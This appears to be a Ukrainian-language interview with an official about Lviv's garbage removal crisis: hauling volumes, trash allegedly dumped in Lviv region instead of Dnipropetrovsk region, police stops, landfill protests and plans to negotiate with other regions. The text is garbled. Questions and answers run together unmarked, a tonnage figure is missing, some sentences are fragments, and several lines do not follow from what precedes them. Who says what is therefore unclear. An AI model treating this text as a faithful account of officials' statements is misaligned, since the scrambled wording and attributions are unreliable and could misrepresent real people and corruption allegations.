	<p>Я думаю, протягом місяця ми зможемо точно сказати, скільки сміття вивозиться зі Львова. Бо зараз, наприклад, перевізники, на моє запитання, скільки ви вивозите сміття, сумарно мені нарахували тонн. На що я їм сказав: "Друзі, ну, це ж неправда". Адже чим більше декларується вивіз сміття, тим більше коштів на це виділяється.</p>
<p>Ви якось озвучували факти, коли машина, яка за документами везла сміття на Дніпропетровщину, висипала його на Львівщині. Для вас зрозуміло, хто стоїть за цією схемою —перевізники чи мерія? Документи виписуються і гроші платяться за вивіз на одну відстань, а реально вивозиться на зовсім іншу відстань. Різницю хтось кладе в кишеню. Але хто кладе в кишеню, за якими домовленостями — хай вирішують правоохоронні органи.</p>
<p>У львівській мерії нам прокоментували, що після передачі повноважень з вивозу сміття виконавчій вертикалі тепер водіїв уже не зупиняють правоохоронці і не повертають з документами назад. Мовляв, ось вам і докази, що раніше була блокада. Але жодного такого факту не було названо. Це записано в протоколі засідання комісії. Також міський голова відповів, що в нього нема зауважень до керівника Національної поліції у Львівській області, який теж був присутній на комісії. А той сюжет, який показав "24 канал"  канал належить дружині Садового, — УП  про те, що в Донецькій області не пустили автомобіль, то це — велика провокація.</p>
<p>Там їхала машина, яка зареєстрована на одну компанію, а тягач і кузов — на іншу, накладна на сміття була виписане на третю компанію, а у водія були документи ще на іншу компанію. Ви уявіть собі ситуацію, у якій опинився правоохоронець? Якщо він на пості пропускає цю машину, тоді він потенційний злочинець. Люди не хочуть бачити в себе львівське сміття. Як ви плануєте вирішувати питання, коли люди перекривають заїзди на полігон, навіть пропри рішення Держкомісії?</p>
<p>Як цебуло, наприклад, 24 червня у Миколаєві Львівської області. Оскільки він не може впоратися з поставленим завданням і виконати рішення комісії з надзвичайних ситуацій. Коли у нас буде щось горіти, ми не будемо дивитися, хто за, хто проти. Нам просто треба буде гасити пожежу. Але якщо голова РДА не має поваги і розуміння серед громади, то він не може бути керівником. З іншого боку, ситуація дійсно є дуже складною. Днями були проблеми в Червонограді, перед цим — в Стрию.</p>
<p>Ми маємо величезну недовіру з боку людей. Тому що, по-перше, людей дуже часто обдурювали, а, по-друге — їх підбурювали. Навіть збирав підписи. Про це мені доповідали очільники Миколаївського району. А сенс?..</p>
		
	<p>Бо в суспільстві ображених і гнаних люблять. З якими областями плануєте домовлятися про вивіз? Для цього я поїду в інші області, особисто буду говорити з мерами та головами обласних адміністрацій.</p>
